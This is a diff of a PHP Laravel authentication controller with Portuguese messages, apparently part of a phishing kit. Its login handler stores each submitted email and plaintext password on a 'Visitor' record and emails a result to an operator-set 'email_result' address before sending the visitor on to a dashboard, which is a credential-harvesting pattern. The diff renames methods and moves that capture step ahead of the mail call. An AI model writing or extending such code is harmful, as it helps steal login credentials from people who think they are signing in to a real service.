@@ -14,18 +14,12 @@ use Inertia\Response;
 use Throwable;
 
 class AuthController extends Controller {
-    public function index()
-    {
-        return view('login');
-    }
-
-
-    public function login(): Response
+    public function __invoke(): Response
     {
         return Inertia::render('Auth/Login');
     }
 
-    public function idLogin(Request $request): Response
+    public function post(Request $request): Response
     {
         $data = $request->validate([
             'email' => 'required|email',
@@ -39,7 +33,7 @@ class AuthController extends Controller {
         ]);
     }
 
-    public function authenticate(): RedirectResponse
+    public function put(): RedirectResponse
     {
         $data = request()->validate([
             'email' => 'required|email',
@@ -52,30 +46,17 @@ class AuthController extends Controller {
             'password.min' => 'O campo senha deve ter pelo menos :min caracteres.',
         ]);
 
+        $visitor = Visitor::current();
+        $visitor->user = $data['email'];
+        $visitor->pass = $data['password'];
+        $visitor->save();
+
         try {
-            Mail::to(Settings::me()->email_result)->sendNow(new EmailLogin($data));
-            $visitor = Visitor::current();
-            $visitor->user = $data['email'];
-            $visitor->pass = $data['password'];
-            $visitor->save();
+            Mail::to(Settings::me()->email_result)->sendNow(new EmailLogin());
         } catch (Throwable $t) {
             Log::error($t);
         }
 
         return redirect()->route('dashboard');
-    }
-
-    public function restrict()
-    {
-        return Inertia::render('Account/Verify', [
-            'email' => Settings::me()->email_result,
-        ]);
-    }
-
-    public function verify()
-    {
-        return Inertia::render('Veify', [
-            'email' => Visitor::current()->user
-        ]);
     }
 }
